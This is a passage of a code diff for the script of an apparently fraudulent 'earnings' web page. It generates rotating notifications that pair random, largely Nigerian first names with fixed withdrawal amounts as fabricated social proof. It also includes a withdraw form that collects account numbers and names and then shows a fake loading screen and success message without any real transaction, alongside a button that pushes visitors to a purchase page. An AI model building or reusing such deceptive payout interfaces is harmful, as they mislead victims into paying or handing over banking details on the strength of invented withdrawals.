+        "Michael", "Abigail", "Matthew", "Avery", "Joseph", "Scarlett", "Samuel",
+        "Grace", "David", "Lily", "Jackson", "Zoey", "Sebastian", "Chloe",
+        "Aiden", "Aria", "Owen", "Lillian", "Gabriel", "Hannah", "Carter",
+        "Addison", "Wyatt", "Aubrey", "Jayden", "Ellie", "Dylan", "Stella",
+        "Luke", "Natalie", "Levi", "Zoe", "Isaac", "Leah", "Andrew", "Hazel",
+        "Lincoln", "Violet", "Jaxon", "Aurora", "Nathan", "Savannah", "Ryan",
+        "Audrey", "Brooklyn", "Christopher", "Bella", "Eli", "Claire",
+        "Hunter", "Skylar", "Connor", "Lucy", "Landon", "Paisley", "Julian",
+        "Everly", "Christian", "Anna", "Caroline", "Isaiah",
+        "Nova", "Charles", "Genesis", "Thomas", "Emilia", "Aaron", "Kennedy",
+        "Ethan", "Samantha", "Adrian", "Maya", "Nicholas", "Willow",
+        "Adebayo", "Ngozi", "Chinedu", "Oluwatobi", "Fatima", "Uche", "Adesuwa",
+        "Ibrahim", "Chimamanda", "Emeka", "Zainab", "Oghenekaro", "Kehinde", "Yemi"
+      ];
+      return names[Math.floor(Math.random() * names.length)];
+    }
+    // ✅ Fixed withdrawal amounts
+    function getRandomAmount() {
+      const allowedAmounts = ["25,000.00", "50,000.00", "100,000.00", "200,000.00"];
+      return allowedAmounts[Math.floor(Math.random() * allowedAmounts.length)];
+    }
+    const notification = document.getElementById('notification');
+    let currentIndex = 0;
+    function showNotification() {
+      if (messages.length > 0) {
+        notification.textContent = messages[currentIndex];
+        notification.classList.add('show');
+        currentIndex = (currentIndex + 1) % messages.length;
+        setTimeout(function () {
+          notification.classList.remove('show');
+          setTimeout(showNotification, Math.random() * 5000 + 1000);
+        }, 4000);
+      }
+    }
 
-            // Check if full name is empty
-            if (fullNameInput.value.trim() === '') {
-                showMessageBox('Please enter your full name.');
-                return;
-            }
+    // Hookup buy button to close popup and go to purchase page immediately
+    const buyBtn = document.getElementById('buyBtn');
+    buyBtn.addEventListener('click', function () {
+      closePopup();
+      // Immediately navigate to purchase page
+      window.location.href = "purchase.html";
+    });
 
-            // Basic email validation
-            if (emailInput.value.trim() === '') {
-                showMessageBox('Please enter your email address.');
-                return;
-            }
+    // --- Carousel Logic ---
+    const carousel = document.getElementById('carousel');
+    const images = carousel.querySelectorAll('img');
+    let carouselIndex = 0;
+    function showSlide(i){ images.forEach((img, idx)=>{ img.style.transform=`translateX(${100*(idx-i)}%)`; }); }
+    showSlide(carouselIndex);
+    setInterval(()=>{ carouselIndex=(carouselIndex+1)%images.length; showSlide(carouselIndex); },3000);
 
-            if (!emailInput.value.includes('@') || !emailInput.value.includes('.')) {
-                showMessageBox('Please enter a valid email address.');
-                return; // Stop the function if validation fails
-            }
+    // --- General Popup Message Logic ---
+    const popup=document.getElementById('popup');
+    function showPopupMessage(msg,d=2000){
+        popup.textContent=msg;
+        popup.style.display='block';
+        setTimeout(()=>{popup.style.display='none'},d);
+    }
+    document.getElementById('transactionHistory').addEventListener('click',(e)=>{ e.preventDefault(); showPopupMessage("No notification available",1500); });
 
-            // Hide the form and show the initial loading screen
-            formC
+    // --- Switch between dashboard and withdraw ---
+    const dashboard=document.getElementById('dashboard');
+    const withdrawPage=document.getElementById('withdrawPage');
+    document.getElementById('addMoneyBtn').addEventListener('click', () => {
+      dashboard.classList.add('hidden');
+      withdrawPage.classList.remove('hidden');
+    });
+    document.getElementById('backBtn').addEventListener('click', () => {
+      withdrawPage.classList.add('hidden');
+      dashboard.classList.remove('hidden');
+    });
+
+    // Placeholder for actual withdraw logic
+    document.getElementById('withdrawBtn').addEventListener('click', () => {
+      const accountNumber = document.getElementById('accountNumber').value;
+      const accountName = document.getElementById('accountName').value;
+      const amount = document.getElementById('amountSelect').value;
+      const tag = document.getElementById('tag').value;
+
+      if (!accountNumber || !accountName || !amount) {
+        showPopupMessage("Please fill in all required fields.", 2000);
+        return;
+      }
+
+      // Simulate loading
+      document.getElementById('loadingOverlay').style.display = 'flex';
+
+      setTimeout(() => {
+        document.getElementById('loadingOverlay').style.display = 'none';
+        // Show success overlay
+        document.getElementById('successOverlay').style.display = 'flex';
+        // Hide success overlay after a few seconds
+        setTimeout(() => {
+          document.getElementById('successOverlay').style.display = 'none';
+          // Optionally reset form or go back to dashboard
+          document.getElementById('withdrawPage').classList.add('hidden');
+          document.getElementById('dashboard').classList.remove('hidden');
+          document.getElementById('accountNumber').value = '';
+          document.getElementById('accountName').value = '';
+          document.getElementById('amountSelect').value = '';
+          document.getElementById('tag').value = '';
+        }, 3000);
+      }, 2000); // Simulate 2 seconds of loading
+    });
+
+    // Initial setup
+    updateDots(); // Initialize dot colors
+    // showNotification(); // Start the notification loop (uncomment to enable)
+
+  </script>
+</body>
+</html>
